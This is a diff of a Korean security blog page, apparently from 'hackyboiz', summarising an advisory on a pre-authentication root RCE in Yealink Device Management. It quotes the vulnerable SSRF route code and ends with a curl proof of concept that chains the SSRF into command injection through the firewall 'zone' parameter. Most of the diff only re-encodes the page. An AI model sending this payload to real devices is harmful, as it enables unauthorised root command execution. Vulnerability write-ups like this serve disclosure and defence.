@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      515 자
+      728 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      14
        분
     </span>
   
@@ -240,54 +240,54 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/">SSD Advisory – Yealink DM Pre Auth ‘root’ level RCE</a></p>
+              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/">SSD Advisory &#x2013; Yealink DM Pre Auth &#x2018;root&#x2019; level RCE</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
-<li>Yealink DM 3.6.0.20 버전 이하</li>
+<li>Yealink DM 3.6.0.20 &#xBC84;&#xC804; &#xC774;&#xD558;</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>통합 개발 및 배포, 실시간 모니터링 및 경고, 원격 문제 해결 등의 솔루션을 가진 Yealink Device Management(이하 Yealink DM) platform에서 인증되지 않은 원격 사용자가 임의 명령을 수행할 수 있는 취약점이 발견되었습니다.</p>
-<p>원격 코드 실행은 pre-auth SSRF 취약점과 Command Injection 취약점을 체이닝 하여 트리거 됩니다. SSRF 취약점이 존재하는 <code>/usr/local/yealink/dmweb/api/index.js</code> 코드 일부는 다음과 같습니다.</p>
-<pre><code class="hljs javascript"> <span class="hljs-number">17</span> <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">app</span> =&gt;</span> &#123;
- <span class="hljs-number">18</span>     app.use(<span class="hljs-string">&#x27;/premise&#x27;</span>, router);
- <span class="hljs-number">19</span> &#125;;
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD1B5;&#xD569; &#xAC1C;&#xBC1C; &#xBC0F; &#xBC30;&#xD3EC;, &#xC2E4;&#xC2DC;&#xAC04; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xBC0F; &#xACBD;&#xACE0;, &#xC6D0;&#xACA9; &#xBB38;&#xC81C; &#xD574;&#xACB0; &#xB4F1;&#xC758; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xAC00;&#xC9C4; Yealink Device Management(&#xC774;&#xD558; Yealink DM) platform&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xACA9; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC740; pre-auth SSRF &#xCDE8;&#xC57D;&#xC810;&#xACFC; Command Injection &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCCB4;&#xC774;&#xB2DD; &#xD558;&#xC5EC; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;. SSRF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>/usr/local/yealink/dmweb/api/index.js</code> &#xCF54;&#xB4DC; &#xC77C;&#xBD80;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs javascript"> <span class="hljs-number">17</span> <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">app</span> =&gt;</span> {
+ <span class="hljs-number">18</span>     app.use(<span class="hljs-string">&apos;/premise&apos;</span>, router);
+ <span class="hljs-number">19</span> };
 [...]
-<span class="hljs-number">217</span> router.get(<span class="hljs-string">&#x27;/front/getPingData&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
-<span class="hljs-number">218</span>     <span class="hljs-comment">// res.send(&#123;&quot;ret&quot;:1,&quot;data&quot;:&quot;PING www.baidu.com (14.215.177.38): 56 data bytes\n64 bytes from 14.215.177.38: seq=0 ttl=54 time=15.084 ms\n64 bytes from 14.215.177.38: seq=1 ttl=54 time=15.888 ms\n64 bytes from 14.215.177.38: seq=2 ttl=54 time=15.742 ms\n64 bytes from 14.215.177.38: seq=3 ttl=54 time=15.622         ms\n64 bytes from 14.215.177.38: seq=4 ttl=54 time=16.384 ms\n\n--- www.baidu.com ping statistics ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 15.084/15.744/16.384 ms\n&quot;,&quot;error&quot;:null&#125;)</span>
+<span class="hljs-number">217</span> router.get(<span class="hljs-string">&apos;/front/getPingData&apos;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
+<span class="hljs-number">218</span>     <span class="hljs-comment">// res.send({&quot;ret&quot;:1,&quot;data&quot;:&quot;PING www.baidu.com (14.215.177.38): 56 data bytes\n64 bytes from 14.215.177.38: seq=0 ttl=54 time=15.084 ms\n64 bytes from 14.215.177.38: seq=1 ttl=54 time=15.888 ms\n64 bytes from 14.215.177.38: seq=2 ttl=54 time=15.742 ms\n64 bytes from 14.215.177.38: seq=3 ttl=54 time=15.622         ms\n64 bytes from 14.215.177.38: seq=4 ttl=54 time=16.384 ms\n\n--- www.baidu.com ping statistics ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 15.084/15.744/16.384 ms\n&quot;,&quot;error&quot;:null})</span>
 <span class="hljs-number">219</span>     <span class="hljs-comment">// return;</span>
-<span class="hljs-number">220</span>     <span class="hljs-keyword">try</span> &#123;
+<span class="hljs-number">220</span>     <span class="hljs-keyword">try</span> {
 <span class="hljs-number">221</span>         <span class="hljs-keyword">let</span> url = req.query.url;
-<span class="hljs-number">222</span>         <span class="hljs-comment">// ��telnet�����pos���ping�trace����������端�����pos��以�并�pos传��</span>
+<span class="hljs-number">222</span>         <span class="hljs-comment">// &#xFFFD;&#xFFFD;telnet&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;pos&#xFFFD;&#xFFFD;&#xFFFD;ping&#xFFFD;trace&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#x7AEF;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;pos&#xFFFD;&#xFFFD;&#x4EE5;&#xFFFD;&#x5E76;&#xFFFD;pos&#x4F20;&#xFFFD;&#xFFFD;</span>
 <span class="hljs-number">223</span>         <span class="hljs-keyword">let</span> pos = req.query.pos;
-<span class="hljs-number">224</span>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`url===<span class="hljs-subst">$&#123;url&#125;</span>`</span>);
-<span class="hljs-number">225</span>         <span class="hljs-keyword">let</span> headers = &#123;
-<span class="hljs-number">226</span>             <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,
-<span class="hljs-number">227</span>             <span class="hljs-string">&#x27;User-Agent&#x27;</span>: req.headers[<span class="hljs-string">&#x27;user-agent&#x27;</span>],
-<span class="hljs-number">228</span>             <span class="hljs-string">&#x27;x-forwarded-for&#x27;</span>: commom.getClientIP(req),
+<span class="hljs-number">224</span>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`url===<span class="hljs-subst">${url}</span>`</span>);
+<span class="hljs-number">225</span>         <span class="hljs-keyword">let</span> headers = {
+<span class="hljs-number">226</span>             <span class="hljs-string">&apos;Content-Type&apos;</span>: <span class="hljs-string">&apos;application/json&apos;</span>,
+<span class="hljs-number">227</span>             <span class="hljs-string">&apos;User-Agent&apos;</span>: req.headers[<span class="hljs-string">&apos;user-agent&apos;</span>],
+<span class="hljs-number">228</span>             <span class="hljs-string">&apos;x-forwarded-for&apos;</span>: commom.getClientIP(req),
 <span class="hljs-number">229</span>             token: req.session.token
-<span class="hljs-number">230</span>         &#125;;
-<span class="hljs-number">231</span>         request.get(&#123;
+<span class="hljs-number">230</span>         };
+<span class="hljs-number">231</span>         request.get({
 <span class="hljs-number">232</span>             url: url,
 <span class="hljs-number">233</span>             headers: headers,
 <span class="hljs-number">234</span>             timeout: <span class="hljs-number">60000</span>,
-<span class="hljs-number">235</span>             qs: &#123;
+<span class="hljs-number">235</span>             qs: {
 <span class="hljs-number">236</span>                 pos: pos
-<span class="hljs-number">237</span>             &#125;
-<span class="hljs-number">238</span>         &#125;).pipe(res);
-<span class="hljs-number">239</span>     &#125; <span class="hljs-keyword">catch</span> (e) &#123;
+<span class="hljs-number">237</span>             }
+<span class="hljs-number">238</span>         }).pipe(res);
+<span class="hljs-number">239</span>     } <span class="hljs-keyword">catch</span> (e) {
 <span class="hljs-number">240</span>         <span class="hljs-built_in">console</span>.error(e);
 <span class="hljs-number">241</span>         res.send(
 <span class="hljs-number">242</span>             errcode.MakeResult(
 <span class="hljs-number">243</span>                 errcode.ERR,
 <span class="hljs-number">244</span>                 e,
 <span class="hljs-number">245</span>                 errcode.INTERNAL_ERROR,
-<span class="hljs-number">246</span>                 <span class="hljs-string">&#x27;server.common.internal.error&#x27;</span>
+<span class="hljs-number">246</span>                 <span class="hljs-string">&apos;server.common.internal.error&apos;</span>
 <span class="hljs-number">247</span>             )
 <span class="hljs-number">248</span>         );
-<span class="hljs-number">249</span>     &#125;
-<span class="hljs-number">250</span> &#125;);</code></pre>
+<span class="hljs-number">249</span>     }
+<span class="hljs-number">250</span> });</code></pre>
 
-<p>17번 줄에서 추가적인 API 사용을 위해 <code>/premise</code> route를 정의합니다. 그 후 217번 줄에서 <code>/premise/front/getPingData</code>를 GET 메소드의 route로 정의합니다. 232번 줄에서 특정 헤더를 사용하여 URL을 GET 메소드로 전송할 수 있습니다. 헤더는 225줄에서 정의되어 있으므로 해당 헤더 값으로 URL을 전송하면 해커가 제어하는 URL을 전송할 수 있습니다.</p>
-<p>해당 취약점을 통해 <code>0.0.0.0:9600/tcp</code>에서 root로 실행되는 <code>smserver</code> 데몬에 요청을 보냅니다. <code>smserver</code>의 <code>mod_firewall.so</code> 모듈에는 Command injection을 할 수 있는 <code>fw_restful_service_get()</code> 함수가 존재합니다. 해당 함수는 <code>zone=</code>에 들어온 GET 변수를 사용하여 명령을 실행합니다.</p>
-<p>따라서 SSRF를 통해 <code>smserver</code>에 payload를 작성하여 보내면 root 권한으로 Remote  Code Execution이 가능합니다.</p>
+<p>17&#xBC88; &#xC904;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xC801;&#xC778; API &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD574; <code>/premise</code> route&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; 217&#xBC88; &#xC904;&#xC5D0;&#xC11C; <code>/premise/front/getPingData</code>&#xB97C; GET &#xBA54;&#xC18C;&#xB4DC;&#xC758; route&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. 232&#xBC88; &#xC904;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD5E4;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; URL&#xC744; GET &#xBA54;&#xC18C;&#xB4DC;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD5E4;&#xB354;&#xB294; 225&#xC904;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xD5E4;&#xB354; &#xAC12;&#xC73C;&#xB85C; URL&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; URL&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; <code>0.0.0.0:9600/tcp</code>&#xC5D0;&#xC11C; root&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; <code>smserver</code> &#xB370;&#xBAAC;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. <code>smserver</code>&#xC758; <code>mod_firewall.so</code> &#xBAA8;&#xB4C8;&#xC5D0;&#xB294; Command injection&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; <code>fw_restful_service_get()</code> &#xD568;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>zone=</code>&#xC5D0; &#xB4E4;&#xC5B4;&#xC628; GET &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>&#xB530;&#xB77C;&#xC11C; SSRF&#xB97C; &#xD1B5;&#xD574; <code>smserver</code>&#xC5D0; payload&#xB97C; &#xC791;&#xC131;&#xD558;&#xC5EC; &#xBCF4;&#xB0B4;&#xBA74; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; Remote  Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs asciidoc">curl --insecure &quot;<span class="hljs-link">https://</span>[<span class="hljs-string">target</span>]/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;&quot;</code></pre>
 
 
@@ -592,6 +592,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
